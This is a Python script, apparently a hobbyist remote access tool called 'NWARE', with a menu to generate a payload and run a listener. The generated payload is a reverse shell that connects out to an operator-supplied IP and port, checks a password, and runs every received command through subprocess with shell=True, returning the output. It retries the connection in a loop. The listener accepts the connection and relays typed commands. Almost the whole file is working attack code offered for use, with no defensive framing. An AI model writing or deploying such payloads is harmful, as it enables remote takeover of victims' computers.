import sys
import time
import urllib
import platform
import os
import socket

def clear():
	if platform.system() == 'Windows':
		os.system("cls")
		return
	if platform.system() == 'Linux':
		os.system("clear")
		return
	else:
		os.system("clear")
		return

def credits():
	clear()
	print("-------------------------------")
	print("All credits go to NXF aka sc3m3")
	print("-------------------------------")
	time.sleep(5)
	clear()
	main()

def listener():

	HOST = ''

	def send_cmds(s, conn, address):
		while True:
			try:
				data = conn.recv(1024).decode('utf-8')
				sys.stdout.write(data)
				cmd = raw_input()
				conn.send(cmd.encode('utf-8'))
			except socket.error as e:
				print("Error: " + str(e))
				time.sleep(5)
				s.close()
				start()


	def socket_accept(s):
		try:
			s.listen(5)
			conn, address = s.accept()
			print("Incoming connection from " + address[0])
			time.sleep(1)
			send_cmds(s, conn, address)
		except socket.error as e:
			print("Error: " + str(e))
			time.sleep(5)
			s.close()
			start()


	def socket_bind(s, host, port):
		try:
			s.bind((host, int(port)))
			socket_accept(s)
		except socket.error as e:
			print("Error while binding host or port: " + str(e))
			time.sleep(5)
			s.close()
			start()

	def start():
		try:
			PORT = input("Input listening port:")
			s = socket.socket()
			socket_bind(s, HOST, PORT)
		except socket.error as e:
			print("Error while creating socket: " + str(e))
			time.sleep(5)
			s.close()
			start()

	start()


def create():
	port = input("Select local port> ")
	ip = raw_input("Input public ip or DNS address> ")
	password = raw_input("Select password to use> ")
	name = raw_input("Select name for payload> ")
	payload = open(name + '.py', 'w+')
	payload.write("import subprocess\nimport socket\nimport time\nimport platform\nimport urllib\nimport sys\ndef Login(s, password):\n    s.send(\"Login: \".encode(\'utf-8\'))\n    pwd = s.recv(1024)\n    if pwd.strip() != password.encode(\'utf-8\'):\n        Login(s, password)\n    else:\n        s.send(\"[+] Connected\\n\".encode(\'utf-8\'))\n        s.send(\">\".encode(\'utf-8\'))\n        Shell(s)\ndef Shell(s):\n    if platform.system() == \'Windows\':\n        while True:\n            data = s.recv(1024)\n            try:\n                proc = subprocess.check_output(data.decode(\'utf-8\'), shell=True, stderr=subprocess.PIPE).decode()\n                s.send(proc.encode(\'utf-8\'))\n                s.send(\">\".encode(\'utf-8\'))\n            except subprocess.CalledProcessError as cpe:\n                s.send(str(cpe).encode(\'utf-8\'))\n                s.send(\">\".encode(\'utf-8\'))\n            except socket.error:\n                s.close()\n                return\n    if platform.system() == \'Linux\':\n        data = s.recv(1024)\n        while True:\n            try:\n                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n                output, errors = proc.communicate()\n                s.send(output.encode(\'utf-8\'))\n                s.send(errors.encode(\'utf-8\'))\n                s.send(\">\".encode(\'utf-8\'))\n            except socket.error:\n                s.close()\n                return\n            except subprocess.CalledProcessError as cpe:\n                s.send(str(cpe).encode(\'utf-8\'))\n                s.send(\"\\n>\".encode(\'utf-8\'))\ndef start(host, port, password):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    while True:\n        try:\n            s.connect((host,port))\n            Login(s, password)\n        except Exception as e:\n            time.sleep(5)\n        else:\n          return\nHOST = \"" + str(ip) + "\"\nPORT = " + str(port) + "\nPASSWORD = \"" + str(password) + "\"\nwhile True:\n    start(HOST, PORT, PASSWORD)")
	payload.close()
	print("Payload successfully created.")
	time.sleep(3)
	main()

def main():
	print("    _   ___       _____    ____  ______")
	print("   / | / / |     / /   |  / __ \\/ ____/")
	print("  /  |/ /| | /| / / /| | / /_/ / __/   ")
	print(" / /|  / | |/ |/ / ___ |/ _  _/ /___   ")
	print("/_/ |_/  |__/|__/_/  |_/_/ |_/_____/   \n\n")
	print("[1] Create payload\n[2] Start listener\n[3] Credits")
	entryNum = raw_input("Select entry> ")
	if entryNum == "1":
		create()
	if entryNum == "2":
		listener()
	if entryNum == "3":
		credits()
	else:
		print("Please select a valid entry.")
		time.sleep(2)
		clear()
		main()

clear()
main()
